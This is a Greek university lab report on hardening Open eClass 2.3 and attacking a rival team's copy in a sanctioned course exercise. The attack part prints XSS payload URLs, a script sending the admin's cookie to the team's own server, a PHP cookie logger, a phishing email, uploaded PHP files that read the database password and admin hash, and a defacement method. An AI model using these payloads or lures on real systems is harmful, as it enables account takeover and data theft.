# ΥΣ13 Προστασία και Ασφάλεια Υπολογιστικών Συστημάτων
## Εαρινό Εξάμηνο 2019-2020
## Διδάσκων: Κώστας Χατζηκοκολάκης
#### Εργασία 1: Web Application Security
#### Ανακοινώθηκε : 26 Μαρτίου 2020 – Προθεσμία παράδοσης: 2 Μαΐου 2020, 23:59

## OmadaPiraulos:
### Βασιλοπούλου Θωμαΐς (1115201500016)
### Γεωργακλή Ελένη (1115201500023)
### Κατιμερτζής Χαράλαμπος – Μιχαήλ (1115201600062)

## Εισαγωγή

Σκοπός της πρώτης εργασίας ήταν να παίξουμε τους ρόλους του αμυνόμενου και του επιτιθέμενου στο περιβάλλον της πραγματικής εφαρμογής Open Eclass 2.3. Μετά την εγκατάσταση της εφαρμογής κληθήκαμε να ασχοληθούμε την προστασία της από SQL Injection, Cross-Site Scripting, Cross-Site Request Forgery και Remote File Injection. Κάθε μέθοδος που θα χρησιμοποιούνταν για την επίτευξη των παραπάνω δεν έπρεπε να επεμβαίνει στην λειτουργικότητα της εφαρμογής. 

Στο πρώτο μέρος του report θα εξηγηθούν τόσο τα προαναφερθέντα προβλήματα ασφαλείας και θα αναλυθούν τα μέσα, που χρησιμοποιήθηκαν για την διόρθωσή τους. Στο δεύτερο μέρος θα αναλυθεί η προσπάθειά μας να επιτεθούμε στο αντίπαλο site που μας ανατέθηκε στην δεύτερη φάση της εργασίας και οι πληροφορίες που καταφέραμε να αντλήσουμε.



## Μέρος 1ο: Προστασία
### 1.1	SQL Injections

Τα SQL Injections είναι μίας μορφής επίθεση που αποσκοπεί τόσο στην εισαγωγή όσο και στην άντληση πληροφοριών από τη βάση, παραποιώντας την τυπική μορφή των SQL Queries μέσω των μεταβλητών που δίνονται σε αυτά από τον χρήστη.  Για την προστασία από τη συγκεκριμένη επίθεση έχουν χρησιμοποιηθεί τρείς (3) διαφορετικές μέθοδοι, τα prepared statements, η διαδικασία escape για ειδικούς χαρακτήρες και η χρήση της intval() για τα IDs. 

Πιο αναλυτικά, λόγω του μεγάλου πλήθους ερωτημάτων έπρεπε να επιλέξουμε ένα μέρος αυτών που θα μετατρέπαμε σε μορφή PDO ως τη πιο ασφαλή αλλαγή. Έτσι προτιμήσαμε σημεία άμεσα προσβάσιμα από τους χρήστες στα οποία υπήρχαν φόρμες που οδηγούσαν στην εκτέλεση ερωτημάτων UPDATE και INSERT INTO και αποτελούν μέσο για αλλαγές στην main βάση eclass.  

Σε όσα ερωτήματα δεν χρησιμοποιήθηκε **PDO**, επιλέχθηκε η έτοιμη συνάρτηση **escapeSimple** που υπάρχει στην /include/lib/main.lib.php, η οποία παρόλο που δεν μας προστατεύει από όλες τις επιθέσεις καλύπτει ένα μεγάλο μέρος αυτών χρησιμοποιώντας τη συνάρτηση get_magic_quotes_gpc() για έλεγχο ειδικών χαρακτήρων και την mysql_real_escape_string() για escape. Η escapeSimple προσφέρει έναν αρκετά καλό συνδυασμό αποδοτικότητας και προστασίας σε σημεία που η χρήση της PDO ήταν ιδιαίτερα περίπλοκη (π.χ. μέσα σε συναρτήσεις). Προσπαθήσαμε να καλύψουμε με escapeSimple όλους τους φακέλους του /modules και ειδικότερα σε αρχεία που περιέχουν πολλά ερωτήματα SQL. 

Η τελευταία μέθοδος που χρησιμοποιήθηκε και συμπληρώνει τις προηγούμενες δύο είναι η χρήση της συνάρτησης **intval()**, για την προστασία IDs και την μετατροπή κάθε πιθανής εισόδου από τον χρήστη σε integer. 


**Στην συνέχεια ακολουθούν τα αρχεία που επεξεργαστήκαμε μαζί με την αντίστοιχη αλλαγή:**


1)	/index.php
-	1 **PDO** για το login σε SELECT και escapeSimple τα υπόλοιπα SELECT
2)	/modules/work/work.php
-	2 **PDOs** σε INSERT INTO, escapeSimple σε UPDATE και INSERT INTO και escapeSimple, intval στα IDs
3)	/modules/work/work_functions.php
-	intval στα IDs σε όλες τις συναρτήσεις 
4)	/modules/phpbb/editpost.php
-	1 **PDO** σε UPDATE, escapeSimple σε όλα τα υπόλοιπα ερωτήματα
5)	/modules/phpbb/functions.php
-	escapeSimple σε όλα τα SELECT
6)	/modules/phpbb/index.php
-	4 **PDOs** σε UPDATE, INSERT INTO και escapeSimple στα SELECT
7)	/modules/phpbb/newtopic.php
-	6 **PDOs** σε SELECT, INSERT INTO, UPDATE και escapeSimple σε SELECT DISTINCT
8)	/modules/phpbb/reply.php
-	5 **PDOs** σε UPDATE, INSERT INTO, SELECT DISTINCT και escapeSimple σε SELECT
9)	/modules/phpbb/viewforum.php
-	2 **PDOs** σε INSERT INTO, UPDATE και escapeSimple στα SELECT
10)	/modules/phpbb/viewtopic.php
-	1 **PDO** σε UPDATE και intval, escapeSimple στα SELECT
11)	/modules/auth/newuser.php
-	3 **PDOs** στα INSERT INTO και SELECT
12)	/modules/auth/newprof.php
-	1 **PDO** σε INSERT INTO
13)	/modules/profile/password.php
-	3 **PDOs** σε SELECT και UPDATE
14)	/modules/profile/profile.php
-	4 **PDOs** σε SELECT και UPDATE 
15)	/modules/dropbox/dropbox_class.inc.php
-	escapeSimple στα INSERT INTO, SELECTS, UPDATES, DELETES
16)	/modules/dropbox/dropbox_init1.inc.php
-	escapeSimple στα SELECTS και DELETES
17)	/modules/dropbox/dropbox_submit.php
-	escapeSimple στα SELECT και UPDATES
18)	/modules/dropbox/index.php
-	escapeSimple στα SELECT DISTINCT
19)	/modules/conference/messageList.php
-	1 **PDO** στο INSERT INTO	
20)	/modules/unreguser/unregcours.php
-	escapeSimple στα ids	
21)	/modules/unreguser/unreguser.php
-	escapeSimple στα ids	
22)	/modules/course_info/archive_course.php
-	escapeSimple στα SELECT
23)	/modules/course_info/delete_course.php
-	escapeSimple στα DELETE
24)	/modules/course_info/refresh_course.php
-	escapeSimple στα DELETE
25)	/modules/course_info/restore_course.php
-	escapeSimple στα SELECT, INSERT INTO
26)	/modules/course_info/infocours.php
-	escapeSimple στα SELECT, INSERT INTO
27)	/modules/agenda/agenda.php
-	escapeSimple, intval και mysql_real_escape_string() σε INSERT INTO και SELECT. 
28)	/modules/agenda/myagenda.php
-	escapeSimple στα SELECT
29)	/modules/search/search_loggedin.php
-	intval σε UID
30)	/modules/announcements/announcements.php
-	escapeSimple στα SELECT
31)	/modules/auth/courses.php
-	escapeSimple στα SELECT, SELECT DISTINCT και DELETE
32)	/modules/auth/opencourses.php
-	intval στο fc και escapeSimple στο SELECT 
33)	/modules/auth/listfaculte.php
-	escapeSimple στο SELECT
34)	/modules/course_description/edit.php
-	escapeSimple σε UPDATE και SELECT
35)	/modules/units/index.php
-	escapeSimple σε UPDATE, DELETE και SELECT
36)	/modules/units/insert.php
-	escapeSimple σε INSERT INTO και SELECT
37)	/modules/admin/change_user.php
-	escapeSimple στο SELECT
38)	/modules/admin/index.php
-	escapeSimple στο UID
39)	/modules/admin/listusers.php
-	escapeSimple στα SELECT
40)	/modules/admin/multireguser.php
-	escapeSimple στο SELECT και INSERT INTO
41)	/modules/admin/newuseradmin.php
-	escapeSimple στο SELECT, INSERT INTO
42)	/modules/admin/password.php
-	escapeSimple στο SELECT
43)	/modules/course_home/course_home.php
-	escapeSimple σε SELECT, UPDATE, DELETE και INSERT INTO


### 1.2	Cross – Site Scripting (XSS)
Οι XSS επιθέσεις ανάγονται στη δυνατότητα εισαγωγής εκτελέσιμου κώδικα, κακόβουλου χρήστη, σε σημεία που το site παίρνει input από το URL, το χρήστη κλπ. Έτσι οι περιπτώσεις XSS επιθέσεων που καλύψαμε διαχωρίζονται σε 2 επιμέρους κατηγορίες:

### 1.	Reflected XSS
Τα Reflected XSS πραγματοποιούνται όταν ο αντίπαλος καταφέρνει να περάσει κώδικα που θα αποσταλλεί μέσω HTTP request (e.g. GET requests) και είτε να εμφανίσει κάποια σελίδα στην οποία ο χρήστης δε θα έπρεπε να έχει πρόσβαση ή να τρέξει κάποιο εκτελέσιμο. Οι τροποποιήσεις μας ανάγονται στη μετατροπή οποιουδήποτε input από το χρήστη σε μορφή αποδεκτή από το σύστημα. 

Έτσι όλα τα inputs σε URL μετατράπηκαν σε ειδικά μορφοποιημένο text με τη χρήση της **htmlspecialchars($urlInput, ENT_QUOTES )** προκειμένου ειδικοί χαρακτήρες όπως τα <, >, ‘, “, κλπ. να μετατρέπονται στην text μορφή τους και να μην επηρεάζουν εντολές του κώδικα. 

**Οι αντίστοιχες αλλαγές είναι οι ακόλουθες:**

1)	/modules/admin/adminannouncements.php: $localize
2)	/modules/admin/edituser.php: $_SESSION $u
3)	/modules/admin/infocours.php:  $_GET $c
4)	/modules/admin/search_user.php:  $_GET $new
5)	/modules/admin/myagenda.php:  $_GET $month, $year
6)	/modules/auth/newprof.php:  $_GET $localize
7)	/modules/course_description/edit.php:  $_REQUEST $numBloc
8)	/modules/forum_admin/forum_admin.php: $_REQUEST $cat_id, $forum_id
9)	/modules/phpbb/viewtopic.php: στα $topic, $forum
10)	/modules/work/work.php: $_POST[‘title’]


### 2.	Stored XSS
Στα Stored XSS attacks, η πρακτική που ακολουθούν οι αντίπαλοι είναι η απόπειρα αποθήκευσης εκτελέσιμου κώδικα (HTML ή JavaScript) στη βάση δεδομένων. Με τον τρόπο αυτό, κατά την επόμενη επίσκεψη του χρήστη στην εν λόγω HTML σελίδα, ο κώδικας του επιτιθέμενου εκτελείται. 

Η προστασία από XSS έγκειται στην “αδρανοποίηση” οποιουδήποτε input το site δέχεται από το χρήστη. Αυτά περιλαμβάνουν φόρμες, chat boxes, σώμα μηνυμάτων, κλπ.  Αυτά τα inputs περνάνε από επεξεργασία με τη χρήση της **htmlspecialchars($urlInput, ENT_QUOTES)** για κάθε πεδίο. Στις περιπτώσεις που χρησιμοποιούνται και για SQL ερωτήματα, θωρακίζονται επιπλέον με τη χρήση **autoquote και escapeSimple** (βλ. SQL INJECTIONS).

**Τα αρχεία που προστατεύθηκαν από Stored XSS είναι τα ακόλουθα:**


1)	/modules/admin/addfaculte.php: στοιχεία φόρμας για νέο faculte
2)	/modules/admin/adminannouncements.php: στοιχεία φόρμας για νέα ανακοίνωση, για επεξεργασία παλιάς ανακοίνωσης
3)	/modules/admin/auth_process.php: φόρμα με ρυθμίσεις πιστοποίσης
4)	/modules/admin/change_user.php: πεδίο για όνομα χρήστη
5)	/modules/admin/edituser.php: φόρμα επεξεργασίας χρήστη
6)	/modules/admin/mailtoprof.php: στο σώμα του μηνύματος 
7)	/modules/admin/multireguser.php: φόρμα για μαζική δημιουργία λογαριασμών χρηστών
8)	/modules/admin/newuseradmin.php: φόρμα εγγραφής εκπαιδευτή
9)	/modules/admin/search_user.php: φόρμα αναζήτησης χρήστη
10)	/modules/agenda/agenda.php: φόρμα ημερολογίου
11)	/modules/announcements/announcements.php: φόρμα νέας ανακοίνωσης
12)	/modules/auth/lostpass.php: φόρμα υπενθύμισης κωδικού πρόσβασης
13)	/modules/auth/newprof.php: αίτηση νέου εκπαιδευτή
14)	/modules/auth/newuser.php: αίτηση νέου χρήστη
15)	/modules/auth/ldapnewuser.php: πεδία φόρμας $ldap_email, $ldap_passwd
16)	/modules/conference/messageList.php: chat box
17)	/modules/conference/pass_parameters.php: πεδία για επεξεργασία video_URL, presentation_URL, netmeeting_show, action
18)	/modules/contact/index.php: μήνυμα επικοινωνίας με τους εκπαιδευτές
19)	/modules/course_description/edit.php: επεξεργασία περιγραφής μαθήματος
20)	/modules/course_home/course_home.php: στοιχεία περιγραφής μαθήματος 
21)	/modules/course_info/infocours.php: φόρμα διαχείρισης μαθήματος
22)	/modules/course_info/restore_course.php: πεδίο για path
23)	/modules/create_course/create_course.php: φόρμα δημιουργίας νέου μαθήματος
24)	/modules/dropbox/dropbox_submit.php: φόρμα για upload αρχείου
25)	/modules/forum_admin/forum_admin.php: φόρμες που προκύπτουν από τη διαχείριση περιοχών
26)	/modules/link/linkfunctions.php: φόρμα προσθήκης συνδέσμου και κατηγορίας
27)	/modules/phpbb/editpost.php: φόρμα επεξεργασίας post στις συζητήσεις
28)	/modules/phpbb/reply.php: απάντηση σε post στις συζητήσεις
29)	/modules/profile/password.php: φόρμα αλλαγής κωδικού πρόσβασης
30)	/modules/profile/profile.php: φόρμα προφίλ
31)	/modules/search/search_loggedοut: φόρμα αναζήτησης για guest/αποσυνδεδεμένους χρήστες
32)	/modules/search/search.php: πεδίο όρου αναζήτησης
33)	/modules/units/info.php: φόρμα προσθήκης θεματικής ενότητας
34)	/modules/work/work.php: φόρμα δημιουργίας, επεξεργασίας, υποβολής εργασίας

### 1.3	Cross – Site Request Forgery (CSRF)
Το CSRF είναι μίας μορφής επίθεση που εστιάζει στην υποκλοπή του cookie του χρήστη μέσω εξωτερικής σελίδας και τον ωθεί να εκτελέσει ενέργειες στο κακόβουλο site που έχουν αντίκτυπο στο site που είναι logged in. Για την προστασία από τέτοιου είδους επιθέσεις χρησιμοποιούνται κρυφά **tokens** τα οποία αποκτούν μία τιμή που παράγεται τυχαία. Στην συνέχεια αυτά τα tokens εισάγονται τόσο στο session του χρήστη όσο και στις περισσότερες από τις φόρμες που υπάρχουν στο site και, όταν γίνεται submit σε κάθε μία από αυτές, ελέγχεται αν το token που συνοδεύει τη φόρμα είναι ίδιο με αυτό που έχει ο χρήστης στο session του. 

**Στην συνέχεια ακολουθούν τα αρχεία που επεξεργαστήκαμε μαζί με την αντίστοιχη αλλαγή:**

1)	/modules/admin/addfaculte.php
-	Χρησιμοποιούνται δύο tokens για τις φόρμες που υποστηρίζει η σελίδα (για δημιουργία και αλλαγή τμημάτων). Με τον τρόπο αυτό προστατεύεται κάθε POST Request που λαμβάνει χώρα στην συγκεκριμένη σελίδα από εξωτερικό site. 
2)	/modules/admin/adminannouncements.php
-	Χρησιμοποιείται ένα token για την φόρμα υποβολής ανακοίνωσης και ελέγχεται η ισότητα του με το session token τόσο στην προσθήκη όσο και στην επεξεργασία. 
3)	/modules/admin/eclassconf.php
-	Χρησιμοποιείται ένα token για την φόρμα υποβολής του νέου eclass configuration, έτσι προστατεύεται το POST Request που παράγεται από το submit της φόρμας και οι επιτιθέμενοι δεν μπορούν να αλλάξουν τη δομή των ρυθμίσεων του eclass.
4)	/modules/admin/edituser.php
-	Χρησιμοποιείται ένα token για την φόρμα επεξεργασίας προφίλ του εκάστοτε χρήστη και τελικά προστατεύεται το POST Request που παράγεται από το submit της φόρμας και οι επιτιθέμενοι δεν μπορούν να επέμβουν στα δεδομένα των τρεχόντων χρηστών.
5)	/modules/upgrade/upgrade.php
-	Χρησιμοποιείται ένα token για το σημείο στο οποίο πρόκειται να γίνει αναβάθμιση της σελίδας του openeclass. Με τον τρόπο αυτό διαφυλάσσεται η ακεραιότητα της εφαρμογής και ο αποκλεισμός τρίτων από την λειτουργία της αναβάθμισης.
6)	/modules/admin/cleanup.php
-	Χρησιμοποιείται ένα token κατά την υποβολή της αίτησης εκκαθάρισης των αρχείων, με σκοπό την αποφυγή κακόβουλης διαγραφής αρχείων από εξωτερικό παράγοντα.
7)	/modules/admin/infocours.php
-	Χρησιμοποιείται ένα token κατά την αλλαγή των στοιχείων ενός μαθήματος, για να αποφευχθεί η κακόβουλη παρεμβολή στα στοιχεία του μαθήματος.
8)	/modules/admin/quotacours.php
-	Χρησιμοποιείται ένα token κατά την αλλαγή των ορίων αποθηκευτικού χώρου ενός μαθήματος, με σκοπό την προστασία από τυχόν παρεμβολές που μπορεί να επηρεάσουν την λειτουργικότητα της εφαρμογής.
9)	/modules/admin/statscοurs.php
-	Χρησιμοποιείται ένα token κατά την αλλαγή της πρόσβασης ενός μαθήματος, με σκοπό την διαφύλαξη της ακεραιότητας των ρυθμίσεων του μαθήματος. 
10)	/modules/admin/mailtoprof.php
-	Χρησιμοποιείται ένα token κατά την αποστολή email στους χρήστες της εφαρμογής, για να απωθήσει χρήστες που δεν είναι logged in ως administrators να εκτελέσουν την συγκεκριμένη λειτουργία.
11)	/modules/admin/multireguser.php
-	Χρησιμοποιείται ένα token κατά την μαζική δημιουργία χρηστών, για να αποτρέψει χρήστες που δεν είναι logged in ως administrators να εκτελέσουν την συγκεκριμένη λειτουργία.
12)	/modules/admin/auth_process.php
-	Χρησιμοποιείται ένα token κατά την αλλαγή της διαδικασίας πιστοποίησης χρηστών, με σκοπό την αποτροπή κακόβουλων αλλαγών που μπορεί να επηρεάσουν την εφαρμογή στο σύνολό της.
13)	/modules/admin/listreq.php
-	Χρησιμοποιείται ένα token κατά την απόρριψη αίτησης εκπαιδευτικού, με σκοπό μόνο ο logged in administrator να μπορεί να απορρίψει μία αίτηση.
14)	/modules/admin/newuseradmin.php
-	Χρησιμοποιείται ένα token κατά την αποδοχή αίτησης εκπαιδευτικού και τελικά την δημιουργία νέου χρήστη, με σκοπό μόνο ο logged in administrator να μπορεί να διαχειριστεί νέους λογαριασμούς χρηστών.
15)	/modules/admin/password.php
-	Χρησιμοποιείται ένα token κατά το POST της φόρμας για αλλαγή συνθηματικού του admin, με σκοπό να αποκλείονται χρήστες που δεν έχουν την ιδιότητα του administrator από την συγκεκριμένη λειτουργία.
16)	/modules/create_course/create_course.php
-	Χρησιμοποιείται ένα token κατά το POST της φόρμας για δημιουργία μαθήματος, το οποίο δημιουργείται κατά την εμφάνιση του πρώτου βήματος και περνάει διαδοχικά από όλες τις επιμέρους φόρμες και τελικά με το submit ελέγχεται. Με αυτόν τον τρόπο αποκλείονται χρήστες που δεν έχουν την ιδιότητα του administrator από την διαδικασία δημιουργίας μαθήματος.
17)	/modules/admin/change_user.php
-	Χρησιμοποιείται ένα token πριν γίνει η είσοδο με λογαριασμού άλλου χρήστη, με σκοπό να μπορεί μόνο ο officially logged in administrator να πραγματοποιήσει αυτή τη λειτουργία.
18)	/modules/course_info/restore_course
-	Χρησιμοποιούνται δύο tokens, που εγγυούνται ότι μόνο ο logged in administrator μπορεί από το δικό του session να κάνει ανάκτηση ενός μαθήματος 
19)	/modules/course_info/infocours.php
-	Χρησιμοποιείται ένα token κατά το POST της φόρμας για επεξεργασία των στοιχείων ενός μαθήματος. Με αυτόν τον τρόπο αποκλείονται χρήστες που δεν έχουν την ιδιότητα του administrator ή του διαχειριστή του μαθήματος από την διαδικασία επεξεργασίας του.
20)	/modules/course_tools/course_tools.php
-	Χρησιμοποιούνται δύο tokens για το ανέβασμα ιστοσελίδων και την προσθήκη συνδέσμων, με σκοπό μόνο όσοι είναι διαχειριστές του μαθήματος να μπορούν να διαμορφώσουν τις επιλογές αυτές.
21)	/modules/forum_admin/forum_admin.php
-	Χρησιμοποιούνται δύο tokens για τη δημιουργία περιοχών συζητήσεων και την προσθήκη υποκατηγοριών, ώστε να διασφαλίζεται πως μόνο ο course administrator μπορεί να επεξεργαστεί αυτά τα στοιχεία.
22)	modules/work/work.php
-	Χρησιμοποιούνται δύο tokens για τη δημιουργία και την επεξεργασία εργασιών, ώστε να διασφαλίζεται πως μόνο ο course administrator μπορεί να έχει πρόσβαση σε αυτά τα στοιχεία.
23)	/modules/user/user.php
-	Χρησιμοποιούνται tokens για κάθε ενέργεια πάνω στους χρήστες ενός μαθήματος (εκπαιδευτές και εκπαιδευόμενους), έτσι ώστε να διασφαλιστεί ότι μόνο ο course administrator μπορεί να επέμβει στα στοιχεία αυτά.
24)	/modules/course_description/edit.php
-	Χρησιμοποιούνται δύο tokens για την προσθήκη και την επεξεργασία της ενότητας “Περιγραφή Μαθήματος”, με σκοπό την αποφυγή CSRF attacks που ενδέχεται να επηρέασουν τη λειτουργικότητα και τις πληροφορίες του εκάστοτε μαθήματος.
25)	/modules/profile/profile.php
-	Χρησιμοποιείται ένα token για να διασφαλιστεί ότι τα στοιχεία ενός χρήστη αλλάζουν από τον ίδιο και όχι από εξωτερικούς παράγοντες που μπορεί να αποκτήσουν πρόσβαση στη σελίδα.
26)	/modules/profile/password.php
-	Χρησιμοποιείται ένα token για να διασφαλιστεί ότι τα password ενός χρήστη αλλάζει από τον ίδιο και όχι από εξωτερικούς παράγοντες που μπορεί να αποκτήσουν πρόσβαση στη σελίδα.
27)	/modules/contact/index.php
-	Χρησιμοποιείται ένα token για να εξασφαλιστεί ότι μόνο εγκεκριμένοι χρήστες μπορούν να στείλουν email σε καθηγητές, ώστε να αποφευχθεί η αποστολή email με κακόβουλο περιεχόμενο.
28)	/modules/phpbb/newtopic.php
-	Χρησιμοποιείται ένα token για να εξασφαλιστεί ότι μόνο εγκεκριμένοι χρήστες μπορούν να συντάξουν νέο θέμα σε μία περιοχή συζητήσεων.
29)	/modules/phpbb/reply.php
-	Χρησιμοποιείται ένα token για να εξασφαλιστεί ότι μόνο εγκεκριμένοι χρήστες μπορούν να απαντήσουν σε μία περιοχή συζητήσεων.


### 1.4	Remote File Injection (RFI)
Η προστασία από RFI βασίζεται στην δυνατότητα ενσωμάτωσης αρχείων από εξωτερικούς χρήστες, με χαρακτηριστικά παραδείγματα το include/require από user defined πεδία και το upload αρχείων που δύνανται να εκτελεστούν να αποτελούν τις μεγαλύτερες απειλές για ένα site. 
Όσον αφορά τα **include/require**, στα σημεία που αυτό κρίθηκε απαραίτητο, δημιουργήθηκε μια **whitelist** προκειμένου ο αντίπαλος να μην μπορεί να συμπεριλάβει κάτι που δεν επιτρέπεται. Αντίστοιχα, για το **upload** αρχείων που απαιτεί το σύστημα, φιλτράρονται οι επιτρεπτοί τύποι αρχείων, προτρέποντας έτσι το χρήστη  να ανεβάζει μόνο μη εκτελέσιμα αρχεία και αλλάζουμε τυχαία τα ονόματα των αρχείων ώστε να μην είναι εύκολα αναγνωρίσιμα.

**Τα αρχεία που περιγράφονται είναι τα:**

1)	/index.php
-	whitelist γλωσσών
2)	/include/init.php
-	whitelist γλωσσών
3)	/install/index.php
-	whitelist γλωσσών
4)	/modules/help/help.php
-	whitelist γλωσσών
5)	/modules/work/work.php
-	**$local_name = md5(md5($local_name))**; <br>
	**return σε αρχεία exe php js html css jsp json*8
6)	/modules/work/work_functions.php
-	**στην συνάρτηση work_secret αλλάζουμε το path από $id σε md5(md5($id))** 
7)	/modules/dropbox/dropbox_submit.php
-	**die σε αρχεία exe php js html css jsp json**
8)	/include/lib/main.lib.php
-	**στην safe_filename περάσαμε το τυχαίο κλειδί σε md5 για να αυξηθεί το μέγεθος του**
9)	/modules/course_info/infocours.php
-	whitelist γλωσσών
10)	/modules/course_info/restore_course.php
-	whitelist γλωσσών <br> 
	**die σε αρχεία exe php js html css jsp json**
11)	/modules/course_tools/course_tools.php
-	**die όλα τα αρχεία εκτός από html**
12)	/modules/phpbb/functions.php
-	whitelist γλωσσών
13)	/upgrade/upgrade.php
-	whitelist γλωσσών


## Μέρος 2ο: Επιθέσεις

Η αντίπαλη ομάδα που μας ανατέθηκε ήταν η: 
ChaosNet: chaosnet.csec.chatzi.org

Πριν από οτιδήποτε άλλο προσπαθήσαμε να πραγματοποιήσουμε κάποια XSS επίθεση με βάση το ευάλωτα σημεία που βρήκαμε στο site του openeclass. Έτσι σκοπός μας ήταν να εντοπίσουμε σημεία που περνάει το script:

                                              <script>alert(1)</script>

Πατώντας τα ακόλουθα URLs καταφέραμε να εμφανίσουμε το script της επιλογής μας στο αντίπαλο site:

1.	http://chaosnet.csec.chatzi.org/modules/auth/newprof.php?uname='><script>alert(1)</script>
2.	http://chaosnet.csec.chatzi.org/modules/auth/newuser.php?uname='><script>alert(1)</script>
3.	http://chaosnet.csec.chatzi.org/modules/phpbb/reply.php?topic=<script>alert(1)</script>&forum=<script>alert(2)</script>
4.	http://chaosnet.csec.chatzi.org/modules/agenda/myagenda.php?month=5&year=<script>alert(1)</script>
5.	http://chaosnet.csec.chatzi.org/modules/auth/ldapnewuser.php?ldap_email='><script>alert(1)</script> 
	
	Επίσης προσπαθήσαμε να κάνουμε SQL Injections σε διάφορες φόρμες που υπήρχαν κατά μήκος του site αλλά και σε ορισμένα URLs βάζοντας στο αντίστοιχο input του χρήστη την τιμή  'OR 1=1-- ή αντίστοιχα 'OR '1'='1-- αποσκοπώντας στο να αντλήσουμε πληροφορίες από τη βάση. Δυστυχώς δεν πέτυχε κάποια από αυτές τις επιθέσεις. 
	
	Στη συνέχεια γνωρίζοντας τις ευπάθειες ως προς το XSS διαμορφώσαμε ένα URL, τέτοιο ώστε να κάνει αυτόν που το πατά redirect στην σελίδα 
  
                                            omadapiraulos.puppies.chatzi.org
                                              
Το URL αυτό περνά φευγαλέα από την σελίδα chaosnet.csec.chatzi.org με σκοπό να αποκτήσουμε το cookie του χρήστη που πατά το ακόλουθο link

http://chaosnet.csec.chatzi.org/modules/auth/newprof.php?uname='><script>window.location='http://omadapiraulos.puppies.chatzi.org/?c='.concat(document.cookie);</script>

Το προηγούμενο URL περάστηκε από link shortener και τελικά προέκυψε το link 

                                            https://qrgo.page.link/oMVeE

Μόλις βρήκαμε τρόπο να μεταβούμε στη δική μας κακόβουλη σελίδα, επικεντρωθήκαμε στον να αντλήσουμε με κάποιο τρόπο το cookie του χρήστη που περνάει μέσω του URL. Για να το πετύχουμε αυτό απλώς έπρεπε να προσθέσουμε στον κώδικα της δικής μας κακόβουλης σελίδας το κομμάτι:


	<?php if (isset($_GET['c'])){
		$file = fopen('foo.txt', 'a');
		fwrite($file, $_GET['c']."\n");
	}?>

Στο παραπάνω τμήμα κώδικα το εν λόγω cookie αντλείται μέσω του GET Request που λαμβάνει χώρα και αποθηκεύεται σε ένα δικό μας foo.txt για μελλοντική χρήση. Έτσι έχοντας κάνει την προηγούμενη διεργασία στείλαμε στον administrator της αντίπαλης ομάδας το ακόλουθο email:

Καλησπέρα σας,
  Στέλνουμε σε εσάς γιατί πιστεύουμε ότι έχετε μία παραπάνω ευαισθησία με την εγκατάλειψη των ζώων. Βρήκαμε στην σχολή κάποια κουτάβια και τα ανεβάσαμε δημόσια ώστε να βρεθεί κάποιος ενδιαφερόμενος να τα υιοθετήσει. Μπορείτε να ενημερώσετε σε κάποια διάλεξη τους φοιτητές σας ώστε να μας βοηθήσετε στην υιοθεσία;
Σας παραθέτουμε φωτογραφία με τα κουτάβια
https://qrgo.page.link/oMVeE
Ευχαριστούμε εκ των προτέρων.


Πείθοντας, λοιπόν, τον administrator να πατήσει το link που του στείλαμε και παρακολουθώντας τυχόν αλλαγές στο foo.txt, πετύχαμε το σκοπό μας και καταφέραμε να κλέψουμε από τον administrator το cookie του. Έτσι πλέον έχοντας στην κατοχή μας το cookie που χρειαζόταν το ενσωματώσαμε στον browser μας και αποκτήσαμε πρόσβαση Διαχειριστή Πλατφόρμας στην αντίπαλη σελίδα. Ως Διαχειριστής φτιάξαμε ένα καινούργιο ανοιχτό μάθημα, γιατί στο αρχικό δεν ήταν επιτρεπτή η είσοδος στους φακέλους μέσω των URLs /courses/TMA100/work ή /courses/TMA100/dropbox. Στην συνέχεια χρησιμοποιώντας λογαριασμό φοιτητή καταφέραμε να ανεβάσουμε το ακόλουθο php αρχείο:

	<?php
	include './../../../../config/config.php';
	echo $mysqlPassword;
	?>

Με τον τρόπο αυτό βρήκαμε τον κωδικό της βάσης που είναι ο:

                                                        2Q68RVAcCV

Έχοντας τον συνδεδεμένο λογαριασμό του administrator προσπαθήσαμε να συνδεθούμε στη βάση μέσω του phpMyAdmin αλλά μας είχαν απαγορεύσει την είσοδο στην συγκεκριμένη σελίδα. Έτσι προσθέσαμε από πλευράς χρήστη το ακόλουθο τμήμα κώδικα (ανεβάζοντάς το σαν εργασία μαθήματος)


    <?php include './../../../../config/config.php'; 
      include './../../../../include/lib/main.lib.php';   
      $pdodb = new PDO("mysql:host=$mysqlServer;dbname=$mysqlMainDb",$mysqlUser, $mysqlPassword, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8")); 
      $userid = 1; 
      $ql= $pdodb->prepare("SELECT `password` FROM `user` WHERE `user_id`= ?");
      $ql->bindParam(1, $userid);
      $ql->execute(); 
      while ($myrow = $ql->fetch(PDO::FETCH_ASSOC)) { 
        $old_pass_db = $myrow['password']; 
      }
    echo $old_pass_db; ?>  

Σημείωση: Κάναμε νέα σύνδεση PDO, γιατί με την χρήση απλού SQL Query δεν ήταν επιτρεπτή η πρόσβαση χωρίς localhost. 

Τελικά υποκλέψαμε τον κωδικό του administrator, όπως ήταν αποθηκευμένος στη βάση:

                                              20dfbc6f7f51216f82ee3d70717cb917
                                                  
Και μετά τον αλλάξαμε σε:

                                                            123456
                                                                
Στο τελευταίο στάδιο του deface αποφασίσαμε να αλλάξουμε και την εμφάνιση της αρχικής σελίδας της αντίπαλης ομάδας. Αυτό το πετύχαμε ανεβάζοντας εκ νέου ως χρήστες μία εργασία, η οποία αποτελούνταν από ένα php αρχείο το οποίο έκανε rename το αρχικό index.php σε index2.php, τον εαυτό του index.php και περιείχε HTML κώδικα με την δική μας αισθητική παρέμβαση. Την εν λόγο σελίδα μπορείτε να τη βρείτε στο URL: 
                                              http://chaosnet.csec.chatzi.org/



## Επίλογος

Μετά την εκπόνηση της πρώτης εργασίας συμπεραίνουμε, ότι καλύτερο είναι ένα site να προστατεύεται κατά την δημιουργία του, και όχι εκ των υστέρων, καθώς αυτό μπορεί να καταστήσει την διαδικασία της προστασίας πολύπλοκη και χαοτική.  Αν και οι σύγχρονοι browsers έχουν ενσωματωμένα αρκετά εργαλεία που διαφυλάσσουν την ασφάλεια των ιστοσελίδων, ο προγραμματιστής πρέπει να εργαστεί έξυπνα προκειμένου να κλείσει κενά ασφαλείας που δεν καλύπτουν οι browsers, με σκοπό την προστασία των δεδομένων των χρηστών. 
